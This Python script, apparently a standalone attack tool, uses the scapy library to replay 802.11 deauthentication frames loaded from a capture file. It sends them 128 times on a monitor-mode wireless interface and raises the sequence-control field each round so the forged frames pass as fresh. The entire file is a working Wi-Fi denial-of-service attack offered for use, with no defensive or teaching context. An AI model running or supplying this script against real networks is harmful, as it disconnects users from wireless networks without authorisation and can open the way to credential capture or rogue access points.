#!/usr/bin/python
#-*-coding:utf-8-*-

import sys,copy

'''
802.11的解除认证帧的subtype==0x0c
'''

from scapy.all import *

iface = 'mon0'

def startDeauthentication(iface):
    deauth = rdpcap('../res/deauth.pcap')[0:4:2] #如果发送了len=12,就会自动发送len=13
    threads = []
    j = -1
    for i in range(128):
        if i%2 == 0:
            j = j+1
        pkt = copy.deepcopy(deauth[i%2])
        pkt.SC = pkt.SC + j*32
        #print(j,':',pkt.SC)
        sendp(pkt)

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        iface = sys.argv[1]
    conf.iface = iface
    startDeauthentication(iface)
    